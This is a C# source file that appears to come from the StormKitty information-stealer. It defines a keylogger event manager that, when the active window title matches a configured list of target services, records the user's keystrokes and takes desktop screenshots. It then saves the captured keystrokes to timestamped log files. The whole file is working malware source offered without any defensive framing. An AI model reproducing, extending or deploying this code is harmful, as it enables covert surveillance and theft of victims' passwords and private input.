using Stealer;
using StormKitty;
using System;
using System.IO;

namespace Keylogger
{
    internal sealed class EventManager
    {


        private static string KeyloggerDirectory = Path.Combine(
            Paths.InitWorkDir(), "logs\\keylogger\\" +
            DateTime.Now.ToString("yyyy-MM-dd"));

        // Start keylogger only if active windows contains target values
        public static void Action()
        {
            if (Detect())
            {
                Keylogger.KeyLogs += "\n\n### " + WindowManager.ActiveWindow + " ### (" +
                    DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt") + ")\n";
                DesktopScreenshot.Make(KeyloggerDirectory);
                Keylogger.KeyloggerEnabled = true;
            } else {
                SendKeyLogs();
                Keylogger.KeyloggerEnabled = false;
            }
        }

        // Detect target data in active window
        private static bool Detect()
        {
            foreach (string text in Config.KeyloggerServices)
                if (WindowManager.ActiveWindow.ToLower().Contains(text))
                    return true;

            return false;
        }

        // Save logs
        private static void SendKeyLogs()
        {
            if (Keylogger.KeyLogs.Length < 45 ||
                string.IsNullOrWhiteSpace(Keylogger.KeyLogs))
                return;

            string logfile = KeyloggerDirectory + "\\" + DateTime.Now.ToString("hh.mm.ss") + ".txt";
            if (!Directory.Exists(KeyloggerDirectory))
                Directory.CreateDirectory(KeyloggerDirectory);

            File.WriteAllText(logfile, Keylogger.KeyLogs);
            Keylogger.KeyLogs = ""; // Clean logs
        }

    }
}
